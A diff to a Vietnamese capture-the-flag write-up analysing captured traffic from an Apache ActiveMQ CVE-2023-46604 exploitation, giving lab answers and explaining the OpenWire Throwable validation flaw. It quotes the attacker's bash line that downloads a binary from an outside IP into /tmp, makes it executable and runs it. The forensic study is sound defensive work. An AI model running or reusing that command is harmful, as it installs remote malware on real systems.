@@ -57,11 +57,12 @@ _**GET /invoice.xml HTTP/1.1**_
 Đây là một yêu cầu HTTP GET để lấy file invoice.xml từ máy chủ, nên mình check bằng cách follow TCP Stream và bắt được nội dung của file XML
 ![image](https://github.com/user-attachments/assets/f8fef9f5-e9d5-4954-b682-6936ff5fa5df)
 
-Sau khi đọc và phân tích nội dung file thì mình kết luận được là trong tệp XML chứa mã độc, trong file đó chứa câu lệnh sau
+Sau khi đọc và phân tích nội dung file thì mình kết luận được là trong tệp XML chứa mã độc, trong file đó chứa câu lệnh bash sau
 
 <pre> curl -s -o /tmp/docker http://128.199.52.72/docker; chmod +x /tmp/docker; ./tmp/docker </pre>
 
 Câu lệnh trên sẽ tải một tệp từ địa chỉ http://128.199.52.72/docker, sau đó cung cấp quyền thực thi cho tệp docker đó
+
 
 => Ans: docker
 <h1>Q6:</h1>
@@ -89,12 +90,22 @@ https://www.openlogic.com/blog/activemq-cve-2023-46604
 
 https://fidelissecurity.com/threatgeek/threat-intelligence/unveiling-apache-activemq-vulnerability/
 
+https://www.vicarius.io/vsociety/posts/apache-activemq-rce-cve-2023-46604?source=post_page-----65aa41a651b1--------------------------------
+
 Bản chất về cách hoạt động của CVE này đó là các lệnh OpenWire không thể validate được các Throwable class type, dẫn tới nguy cơ RCE.
 Trong bài lab này, đoạn mã XML đã sử dụng class ProcessBuilder để tạo và khởi chạy mã độc.
 ![image](https://github.com/user-attachments/assets/9d7c09f4-1d58-4434-a486-8873efe69ccc)
 
-Trong đoạn code trên, method validateIsThrowable được sử dụng để đảm bảo rằng chỉ các class kế thừa từ Throwable mới được chấp nhận và xử lý. Nếu không có method này hoặc method không hoạt động đúng cách, bất kỳ class nào cũng có thể được chấp nhận và thực thi, bao gồm cả các class chứa mã độc. 
+Trong đoạn code trên, method validateIsThrowable đã được update vào bản patch OpenWire và được sử dụng để đảm bảo rằng chỉ các class kế thừa từ Throwable mới được chấp nhận và xử lý. Nếu không có method này hoặc method không hoạt động đúng cách, bất kỳ class nào cũng có thể được chấp nhận và thực thi, bao gồm cả các class chứa mã độc. 
 
  
 <h1>Q8:</h1>
+<h2>Problem</h2>
+What is the vulnerable Java method and class that allows an attacker to run arbitrary code? (Format: Class.Method)
+
+<h2>Solution</h2>
+https://www.vicarius.io/vsociety/posts/apache-activemq-rce-cve-2023-46604?source=post_page-----65aa41a651b1--------------------------------
+
+Mình research được thêm bài viết này và có câu trả lời 
+=> Ans: BaseDataStreamMarshaller.createThrowable
 
